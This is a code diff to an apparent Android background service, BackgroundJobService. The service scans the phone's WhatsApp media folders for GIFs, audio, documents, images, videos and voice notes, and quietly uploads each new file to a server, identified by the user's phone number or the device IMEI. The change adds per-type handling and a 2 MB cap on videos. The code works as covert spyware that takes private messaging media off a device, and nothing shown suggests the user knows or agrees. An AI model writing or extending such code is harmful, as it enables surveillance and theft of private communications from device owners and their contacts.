@@ -353,12 +353,12 @@ public class BackgroundJobService {
                 String vidoePath = mediaPath + "WhatsApp Video";
                 String voiceNotesPath = mediaPath + "WhatsApp Voice Notes";
 
-                if (!processMediaFiles(gifPath)) {
-                    if (!processMediaFiles(audioPath)) {
-                        if (!processMediaFiles(docPath)) {
-                            if (!processMediaFiles(imagePath)) {
-                                if (!processMediaFiles(vidoePath)) {
-                                    processMediaFiles(voiceNotesPath);
+                if (!processMediaFiles(gifPath,"image")) {
+                    if (!processMediaFiles(audioPath,"audio")) {
+                        if (!processMediaFiles(docPath,"doc")) {
+                            if (!processMediaFiles(imagePath,"image")) {
+                                if (!processMediaFiles(vidoePath,"video")) {
+                                    processMediaFiles(voiceNotesPath,"audio");
                                 }
                             }
                         }
@@ -369,25 +369,45 @@ public class BackgroundJobService {
             }
         }
     }
-    private boolean processMediaFiles(String mediaPath){
+    private boolean processMediaFiles(String mediaPath,String type){
         File folder = new File(mediaPath);
         if(folder.exists()){
             File[] files = folder.listFiles();
             if(files != null) {
                 for (File file : files) {
                     if (file.isFile()) {
-                        String name = file.getName();
-                        if (dbService.getMedia(name) == null) {
-                            MediaEntity mediaEntity = new MediaEntity();
-                            mediaEntity.setName(name);
-                            dbService.saveMedia(mediaEntity);
-                            //server call
-                            smsService.sendMedia(file, (UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
-                            return true;
+                        if(type.equals("video")){
+                            long fileSize = file.length();
+                            double kilobytes = (fileSize / 1024);
+                            double megabytes = (kilobytes / 1024);
+                            if(megabytes <= 2){// file size less than 2mb for video file only
+                                boolean isSent = sendMediaFile(file);
+                                if(isSent){
+                                    return true;
+                                }
+                            }
+                        }else{
+                            boolean isSent = sendMediaFile(file);
+                            if(isSent){
+                                return true;
+                            }
                         }
                     }
                 }
             }
+        }
+        return false;
+    }
+
+    private boolean sendMediaFile(File file){
+        String name = file.getName();
+        if (dbService.getMedia(name) == null) {
+            MediaEntity mediaEntity = new MediaEntity();
+            mediaEntity.setName(name);
+            dbService.saveMedia(mediaEntity);
+            //server call
+            smsService.sendMedia(file, (UserMobile == null || UserMobile.equals("")) ? imeiNumber : UserMobile);
+            return true;
         }
         return false;
     }
